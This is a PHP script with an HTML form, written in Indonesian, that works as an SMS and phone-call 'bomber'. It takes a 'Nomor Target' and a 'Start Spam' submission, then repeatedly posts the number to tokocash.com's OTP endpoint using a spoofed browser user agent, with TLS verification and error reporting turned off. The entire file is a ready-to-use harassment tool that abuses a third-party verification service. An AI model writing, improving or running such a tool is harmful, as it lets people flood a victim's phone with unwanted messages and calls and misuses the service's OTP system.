<?php
error_reporting(0);

Class Bom {

	public $no,
         $type;
         
  public function __construct(){
  	echo '<script type="text/javascript" src="js/sweetalert.min.js"></script>';
  }

	public function sendC($url, $page, $params) {

        $ch = curl_init(); 
        curl_setopt ($ch, CURLOPT_URL, $url.$page); 
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 

        if(!empty($params)) {
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt ($ch, CURLOPT_POST, 1); 
        }

        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);

        $headers  = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
        $headers[] = 'X-Requested-With: XMLHttpRequest';

        curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
        //curl_setopt ($ch, CURLOPT_HEADER, 1);
        $result = curl_exec ($ch);
        curl_close($ch);
        return $result;

    }

    private function getStr($start, $end, $string) {
        if (!empty($string)) {
        $setring = explode($start,$string);
        $setring = explode($end,$setring[1]);
        return $setring[0];
        }
    }


    public function Verif()
    {
        $url = "https://www.tokocash.com/oauth/otp";
        $no = $this->no;
        $type = $this->type;
        if ($type == 1) {
            $data = "msisdn={$no}&accept=";
        }elseif ($type == 2) {
            $data = "msisdn={$no}&accept=call";
        }
        $send = $this->sendC($url, null, $data);
        // echo $send;
        if (preg_match('/otp_attempt_left/', $send)) {
                echo '<script>
swal("OTP Sukses", "Sedang memanggil", "success")
</script>';
            } else {
                
                echo '<script>
swal("OTP Sukses", "Sedang mengirim pesan", "success")
</script>';
            }
    }
}
?>
<main class="app-content">
	<div class="app-title">
		<div>
          <h1><?= $jenis; ?></h1>
        </div>
        <ul class="app-breadcrumb breadcrumb">
          <a href="<?= base_url() ?>">
          	<li class="breadcrumb-item"><i class="fa fa-home fa-lg"></i></a></li>
          <li class="breadcrumb-item"><?= $title; ?></li>
        </ul>
      </div>
	</div>
		<div class="row">
		<div class="col-md-6">
		<div class="tile">
		<form method="post">
		<select class="custom-select" name="type" required>
		<option selected="selected">Pilih Type</option>
		<option value="1">SMS</option>
		<option value="2">Telepon</option>
		</select>
		<input type="text" class="form-control mt-3 bg-transparent text-center" value="3x/jam" disabled>
		</div>
		</div>
			<div class="col-md-6">
				<div class="tile">
					
					<input type="tel" name="nomor" class="form-control mb-3" placeholder="Nomor Target" required>
					<input type="submit" name="ok" class="btn btn-primary btn-block" value="Start Spam">
					</form>
				</div>
			</div>
		</div>
	</main>
<?php
if(isset($_POST["ok"])){
$init = new Bom();
$init->type = $_POST["type"];
$init->no = $_POST["nomor"];

if ($init->type == 1) {
	for ($i=0; $i < 2; $i++) { 
	    $init->Verif($init->no,$init->type);
	}
}elseif ($init->type == 2) {
	 $init->Verif($init->no,$init->type);
	}
}
?>